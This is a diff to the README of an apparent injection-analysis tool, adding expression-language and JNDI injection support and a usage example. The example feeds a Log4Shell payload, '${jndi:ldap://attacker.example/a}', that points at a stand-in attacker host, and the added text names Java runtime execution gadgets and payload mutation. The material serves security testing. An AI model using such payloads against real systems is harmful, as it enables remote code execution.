@@ -52,6 +52,15 @@ GraphQL injection:
   introspection field, with field, directive, and introspection payload
   mutation.
 
+Expression language (EL / OGNL / SpEL / JNDI) injection:
+
+- Analyzes an input reaching a Java expression-language interpolation (`${...}`,
+  `#{...}`, `%{...}`), classifying literal-text, in-expression, and
+  expression-string contexts. Detects opening an evaluated expression from text,
+  a `${jndi:...}` lookup (Log4Shell), and RCE gadgets
+  (`T(java.lang.Runtime)...`, `@java.lang.Runtime@...`, `ProcessBuilder`), with
+  payload mutation across SpEL, OGNL, and JNDI flavors.
+
 YAML injection:
 
 - Analyzes an input embedded in a YAML scalar, classifying plain, single-quoted,
@@ -245,6 +254,12 @@ Analyze GraphQL injection with `--lang graphql`:
 
 ```bash
 xyainjex -l graphql '{ user(id: {INPUT}) { id } }' '1) { id password }'
+```
+
+Analyze expression-language / JNDI injection with `--lang el`:
+
+```bash
+xyainjex -l el '[INFO] user={INPUT}' '${jndi:ldap://attacker.example/a}'
 ```
 
 Analyze YAML injection with `--lang yaml`:
